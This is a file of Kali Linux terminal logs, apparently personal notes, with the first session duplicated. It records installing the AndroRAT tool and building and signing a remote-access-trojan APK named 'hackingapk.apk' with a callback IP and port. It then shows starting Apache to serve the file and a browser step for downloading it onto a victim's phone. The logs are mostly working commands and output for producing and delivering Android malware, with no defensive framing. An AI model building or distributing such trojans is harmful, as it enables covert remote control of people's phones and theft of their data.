@@ -1,0 +1,295 @@
+┌──(subhro1530㉿subhro)-[/home]
+└─$ sudo su 
+┌──(root㉿subhro)-[/home]
+└─# ls
+lost+found  subhro1530
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home]
+└─# subhro1530
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530]
+└─# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530]
+└─# Desktop 
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop]
+└─# ls
+AndroRAT  hydra.restore
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop]
+└─# AndroRAT
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# ls
+Android_Code  androRAT.py  Compiled_apk  Jar_utils  LICENSE  README.md  requirements.txt  Screenshots  utils.py
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# pip install -r requirements.txt
+Collecting pyngrok
+  Downloading pyngrok-5.2.1.tar.gz (761 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 761.3/761.3 kB 297.3 kB/s eta 0:00:00
+  Preparing metadata (setup.py) ... done
+Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from pyngrok->-r requirements.txt (line 1)) (5.4.1)
+Building wheels for collected packages: pyngrok
+  Building wheel for pyngrok (setup.py) ... done
+  Created wheel for pyngrok: filename=pyngrok-5.2.1-py3-none-any.whl size=19793 sha256=6cb4ee4871583b78da4521b49f3c8f42b3ea2f42f21ed8895bbf623a1d26d761
+  Stored in directory: /root/.cache/pip/wheels/1a/b2/89/c70c614777a68db33b539d5b3ba68d22bda56c0aa827fe1a3e
+Successfully built pyngrok
+Installing collected packages: pyngrok
+Successfully installed pyngrok-5.2.1
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# cat requirements.txt
+pyngrok                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# python3                        
+Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print("Hello"
+... )
+Hello
+>>> for i in range(1,50):
+... print(i)
+  File "<stdin>", line 2
+    print(i)
+    ^
+IndentationError: expected an indented block after 'for' statement on line 1
+>>> 
+>>> while true:
+...     print(l++)
+  File "<stdin>", line 2
+    print(l++)
+             ^
+SyntaxError: invalid syntax
+>>> l=0
+>>> while true:
+...     print(l+1)
+... 
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'true' is not defined. Did you mean: 'True'?
+>>> 
+KeyboardInterrupt
+>>> 
+KeyboardInterrupt
+>>> 
+zsh: suspended  python3
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# python3 androRAT.py --build -i 10.0.2.15 -p 4444 -o hackingapk.apk
+[INFO] Generating APK
+[INFO] Building APK | 
+[SUCCESS] Successfully apk built in /home/subhro1530/Desktop/AndroRAT/hackingapk.apk
+[INFO] Signing the apk
+[INFO] Signing Apk | 
+[SUCCESS] Successfully signed the apk hackingapk.apk
+ 
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# ls -l
+total 2344
+drwxr-xr-x 5 root root    4096 Jan  3 08:03 Android_Code
+-rw-r--r-- 1 root root    2485 Jan  3 08:03 androRAT.py
+drwxr-xr-x 7 root root    4096 Jan  3 08:03 Compiled_apk
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 Dumps
+-rw-r--r-- 1 root root 2332330 Jan  3 08:19 hackingapk.apk
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Jar_utils
+-rw-r--r-- 1 root root    1054 Jan  3 08:03 LICENSE
+-rw-r--r-- 1 root root     641 Jan  3 08:15 packages.microsoft.gpg
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 __pycache__
+-rw-r--r-- 1 root root    6596 Jan  3 08:03 README.md
+-rw-r--r-- 1 root root       7 Jan  3 08:03 requirements.txt
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Screenshots
+-rw-r--r-- 1 root root   14249 Jan  3 08:03 utils.py
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# ls -lt
+total 2344
+-rw-r--r-- 1 root root 2332330 Jan  3 08:19 hackingapk.apk
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 Dumps
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 __pycache__
+-rw-r--r-- 1 root root     641 Jan  3 08:15 packages.microsoft.gpg
+-rw-r--r-- 1 root root    2485 Jan  3 08:03 androRAT.py
+-rw-r--r-- 1 root root    6596 Jan  3 08:03 README.md
+-rw-r--r-- 1 root root       7 Jan  3 08:03 requirements.txt
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Screenshots
+-rw-r--r-- 1 root root   14249 Jan  3 08:03 utils.py
+-rw-r--r-- 1 root root    1054 Jan  3 08:03 LICENSE
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Jar_utils
+drwxr-xr-x 7 root root    4096 Jan  3 08:03 Compiled_apk
+drwxr-xr-x 5 root root    4096 Jan  3 08:03 Android_Code
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# 
+                                                                  
+
+
+
+
+
+
+
+			TERMINAL 2:
+			
+			
+			
+			
+
+┌──(subhro1530㉿subhro)-[/home]
+└─$ sudo su 
+┌──(root㉿subhro)-[/home]
+└─# ls
+lost+found  subhro1530
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home]
+└─# subhro1530
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530]
+└─# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530]
+└─# Desktop 
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop]
+└─# ls
+AndroRAT  hydra.restore
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop]
+└─# AndroRAT
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# ls
+Android_Code  androRAT.py  Compiled_apk  Jar_utils  LICENSE  README.md  requirements.txt  Screenshots  utils.py
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# pip install -r requirements.txt
+Collecting pyngrok
+  Downloading pyngrok-5.2.1.tar.gz (761 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 761.3/761.3 kB 297.3 kB/s eta 0:00:00
+  Preparing metadata (setup.py) ... done
+Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from pyngrok->-r requirements.txt (line 1)) (5.4.1)
+Building wheels for collected packages: pyngrok
+  Building wheel for pyngrok (setup.py) ... done
+  Created wheel for pyngrok: filename=pyngrok-5.2.1-py3-none-any.whl size=19793 sha256=6cb4ee4871583b78da4521b49f3c8f42b3ea2f42f21ed8895bbf623a1d26d761
+  Stored in directory: /root/.cache/pip/wheels/1a/b2/89/c70c614777a68db33b539d5b3ba68d22bda56c0aa827fe1a3e
+Successfully built pyngrok
+Installing collected packages: pyngrok
+Successfully installed pyngrok-5.2.1
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# cat requirements.txt
+pyngrok                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# python3                        
+Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print("Hello"
+... )
+Hello
+>>> for i in range(1,50):
+... print(i)
+  File "<stdin>", line 2
+    print(i)
+    ^
+IndentationError: expected an indented block after 'for' statement on line 1
+>>> 
+>>> while true:
+...     print(l++)
+  File "<stdin>", line 2
+    print(l++)
+             ^
+SyntaxError: invalid syntax
+>>> l=0
+>>> while true:
+...     print(l+1)
+... 
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'true' is not defined. Did you mean: 'True'?
+>>> 
+KeyboardInterrupt
+>>> 
+KeyboardInterrupt
+>>> 
+zsh: suspended  python3
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# python3 androRAT.py --build -i 10.0.2.15 -p 4444 -o hackingapk.apk
+[INFO] Generating APK
+[INFO] Building APK | 
+[SUCCESS] Successfully apk built in /home/subhro1530/Desktop/AndroRAT/hackingapk.apk
+[INFO] Signing the apk
+[INFO] Signing Apk | 
+[SUCCESS] Successfully signed the apk hackingapk.apk
+ 
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# ls -l
+total 2344
+drwxr-xr-x 5 root root    4096 Jan  3 08:03 Android_Code
+-rw-r--r-- 1 root root    2485 Jan  3 08:03 androRAT.py
+drwxr-xr-x 7 root root    4096 Jan  3 08:03 Compiled_apk
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 Dumps
+-rw-r--r-- 1 root root 2332330 Jan  3 08:19 hackingapk.apk
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Jar_utils
+-rw-r--r-- 1 root root    1054 Jan  3 08:03 LICENSE
+-rw-r--r-- 1 root root     641 Jan  3 08:15 packages.microsoft.gpg
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 __pycache__
+-rw-r--r-- 1 root root    6596 Jan  3 08:03 README.md
+-rw-r--r-- 1 root root       7 Jan  3 08:03 requirements.txt
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Screenshots
+-rw-r--r-- 1 root root   14249 Jan  3 08:03 utils.py
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# ls -lt
+total 2344
+-rw-r--r-- 1 root root 2332330 Jan  3 08:19 hackingapk.apk
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 Dumps
+drwxr-xr-x 2 root root    4096 Jan  3 08:19 __pycache__
+-rw-r--r-- 1 root root     641 Jan  3 08:15 packages.microsoft.gpg
+-rw-r--r-- 1 root root    2485 Jan  3 08:03 androRAT.py
+-rw-r--r-- 1 root root    6596 Jan  3 08:03 README.md
+-rw-r--r-- 1 root root       7 Jan  3 08:03 requirements.txt
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Screenshots
+-rw-r--r-- 1 root root   14249 Jan  3 08:03 utils.py
+-rw-r--r-- 1 root root    1054 Jan  3 08:03 LICENSE
+drwxr-xr-x 2 root root    4096 Jan  3 08:03 Jar_utils
+drwxr-xr-x 7 root root    4096 Jan  3 08:03 Compiled_apk
+drwxr-xr-x 5 root root    4096 Jan  3 08:03 Android_Code
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# 
+                         
+              
+              
+              
+              
+           
+                         
+                         TERMINAL 3:
+
+
+
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# sudo systemctl status apache2.service                                                                                                                                                     
+○ apache2.service - The Apache HTTP Server
+     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
+     Active: inactive (dead)
+       Docs: https://httpd.apache.org/docs/2.4/
+                                                                                                                                                                                                                                            
+┌──(root㉿subhro)-[/home/subhro1530/Desktop/AndroRAT]
+└─# sudo systemctl start apache2.service
+                                         
+
+
+
+
+In chrome or firefox:
+
+-->  <IP ADRESS>/hackingapk.apk
+			
